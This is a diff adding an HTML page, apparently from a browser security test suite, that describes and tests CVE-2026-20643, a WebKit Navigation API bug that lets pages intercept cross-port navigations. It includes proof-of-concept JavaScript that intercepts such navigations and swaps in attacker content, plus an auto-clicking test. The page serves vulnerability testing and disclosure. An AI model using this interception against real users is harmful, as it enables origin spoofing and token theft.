@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>UXSS-SAFARI-01: WebKit Navigation API canIntercept SOP Bypass</title>
+    <link rel="stylesheet" href="../../../css/style.css">
+</head>
+<body class="test-page" style="background:#0d1117;color:#c9d1d9;">
+<div class="container">
+    <a href="../../../index.html" class="btn btn-back">&larr; Back to Suite</a>
+    <h1>WebKit NavigateEvent.canIntercept SOP Bypass</h1>
+    <div class="meta">
+        <span>ID: UXSS-SAFARI-01</span>
+        <span>CVE: CVE-2026-20643</span>
+        <span>Browsers: Safari (pre-26.3.1(a)), all iOS browsers</span>
+        <span>Category: SOP Bypass / UXSS</span>
+    </div>
+
+    <div class="test-section">
+        <h2>Description</h2>
+        <p><code>NavigateEvent.canIntercept</code> incorrectly returns <code>true</code> for
+        same-site but cross-port navigations. The interception gate accepts any HTTP-family
+        target after a same-site check without verifying that scheme, host, <strong>and port</strong>
+        all match.</p>
+        <p>This allows an attacker-controlled page to intercept or suppress navigations that
+        should cross an origin boundary. Can be chained for UXSS or OAuth token theft.</p>
+        <p>Discovered by Thomas Espach. Fixed via Apple Background Security Improvements (BSI).</p>
+    </div>
+
+    <div class="test-section">
+        <h2>Technique (from public PoC by zeroxjf)</h2>
+        <div class="code-block">// Vulnerable code path: WebCore::Navigation::innerDispatchNavigateEvent
+// The flawed logic:
+//   if (!isSameSite && !isSameOrigin) return false;
+//   if (targetURL.protocolIsInHTTPFamily()) return true;
+//   // Missing: port/host/scheme component equality check!
+
+// PoC: serve on port 8000, navigate to port 8800
+// On vulnerable builds, NavigateEvent.canIntercept returns true
+// for cross-port (cross-origin) navigations
+
+navigation.addEventListener('navigate', (event) => {
+    const destUrl = new URL(event.destination.url);
+    // On vulnerable Safari: canIntercept is true even for different port
+    if (event.canIntercept) {
+        event.intercept({
+            handler() {
+                // Attacker can now serve arbitrary content
+                // while the address bar shows the target origin
+                document.body.innerHTML = '&lt;h1&gt;Intercepted!&lt;/h1&gt;';
+            }
+        });
+    }
+});</div>
+    </div>
+
+    <div class="test-section">
+        <h2>Run Test</h2>
+        <p style="color:#d29922;font-size:0.85em;">This test requires two ports. Best tested
+        locally with <code>python3 -m http.server 8000</code> and a service on port 8800.</p>
+        <button class="btn btn-run" onclick="runTest()">Test canIntercept Cross-Port</button>
+        <button class="btn" onclick="runDetectionOnly()">Detection Only (no navigation)</button>
+        <div id="output" class="output-box" style="margin-top:10px;"></div>
+    </div>
+</div>
+
+<script src="../../../js/utils.js"></script>
+<script>
+function runTest() {
+    const output = document.getElementById('output');
+    const info = detectBrowser();
+    output.innerHTML = '<div style="color:#d29922;">Running CVE-2026-20643 test...</div>';
+    output.innerHTML += '<div style="color:#8b949e;">Browser: ' + info.browser + ' ' + info.version + ' (' + info.engine + ')</div>';
+
+    if (!window.navigation) {
+        output.innerHTML += '<div style="color:#8b949e;">Navigation API not available. ';
+        if (info.engine === 'WebKit') {
+            output.innerHTML += 'WebKit version may be too old for Navigation API support.</div>';
+        } else {
+            output.innerHTML += 'This browser may not support the Navigation API.</div>';
+        }
+        reportResult('output', 'CVE-2026-20643', false, 'Navigation API not supported');
+        return;
+    }
+
+    const currentPort = location.port || (location.protocol === 'https:' ? '443' : '80');
+    const targetPort = parseInt(currentPort) + 800;
+    const targetUrl = location.protocol + '//' + location.hostname + ':' + targetPort + '/';
+
+    output.innerHTML += '<div style="color:#8b949e;">Current origin: ' + location.origin + '</div>';
+    output.innerHTML += '<div style="color:#8b949e;">Target (cross-port): ' + targetUrl + '</div>';
+
+    let intercepted = false;
+
+    navigation.addEventListener('navigate', function handler(event) {
+        const destUrl = new URL(event.destination.url);
+        output.innerHTML += '<div style="color:#58a6ff;">NavigateEvent fired for: ' + event.destination.url + '</div>';
+        output.innerHTML += '<div style="color:#58a6ff;">canIntercept: ' + event.canIntercept + '</div>';
+        output.innerHTML += '<div style="color:#58a6ff;">hashChange: ' + event.hashChange + '</div>';
+
+        if (event.canIntercept && destUrl.port !== currentPort) {
+            intercepted = true;
+            event.intercept({
+                handler: function() {
+                    output.innerHTML += '<div style="color:#f85149;font-weight:bold;">VULNERABLE: Cross-port navigation was interceptable!</div>';
+                    reportResult('output', 'CVE-2026-20643 canIntercept bypass', true,
+                        'NavigateEvent.canIntercept returned true for cross-origin (different port) navigation');
+                    return Promise.resolve();
+                }
+            });
+        }
+
+        navigation.removeEventListener('navigate', handler);
+    });
+
+    // Attempt cross-port navigation via a link click
+    const link = document.createElement('a');
+    link.href = targetUrl;
+    link.textContent = 'Cross-port link (auto-clicking)';
+    link.style.display = 'none';
+    document.body.appendChild(link);
+    link.click();
+
+    setTimeout(function() {
+        if (!intercepted) {
+            reportResult('output', 'CVE-2026-20643 canIntercept bypass', false,
+                'Cross-port navigation was NOT interceptable (patched or not applicable)');
+        }
+    }, 3000);
+}
+
+function runDetectionOnly() {
+    const output = document.getElementById('output');
+    const info = detectBrowser();
+    output.innerHTML = '<div style="color:#d29922;">Running detection-only check...</div>';
+    output.innerHTML += '<div style="color:#8b949e;">Browser: ' + info.browser + ' ' + info.version + ' (' + info.engine + ')</div>';
+
+    const checks = [];
+
+    // Check 1: Navigation API existence
+    checks.push('Navigation API: ' + (window.navigation ? 'YES' : 'NO'));
+
+    // Check 2: NavigateEvent constructor
+    checks.push('NavigateEvent: ' + (typeof NavigateEvent !== 'undefined' ? 'YES' : 'NO'));
+
+    // Check 3: WebKit engine
+    checks.push('WebKit engine: ' + (info.engine === 'WebKit' ? 'YES' : 'NO'));
+
+    // Check 4: iOS detection
+    const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) ||
+                  (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
+    checks.push('iOS device: ' + (isIOS ? 'YES' : 'NO'));
+
+    // Check 5: Safari version
+    if (info.browser === 'Safari') {
+        const ver = parseFloat(info.version);
+        checks.push('Safari version: ' + info.version);
+        checks.push('Potentially vulnerable (pre-26.3.1): ' + (ver < 26.3 ? 'POSSIBLE' : 'LIKELY PATCHED'));
+    }
+
+    output.innerHTML += '<div style="color:#8b949e;">' + checks.join('<br>') + '</div>';
+
+    if (info.engine === 'WebKit' && window.navigation) {
+        output.innerHTML += '<div style="color:#d29922;">This browser may be testable. Use the full test to attempt cross-port interception.</div>';
+    } else if (info.engine === 'WebKit') {
+        output.innerHTML += '<div style="color:#8b949e;">WebKit detected but Navigation API not available. May need newer Safari version to test.</div>';
+    } else {
+        output.innerHTML += '<div style="color:#8b949e;">Non-WebKit browser. This CVE is WebKit-specific.</div>';
+    }
+}
+</script>
+</body>
+</html>
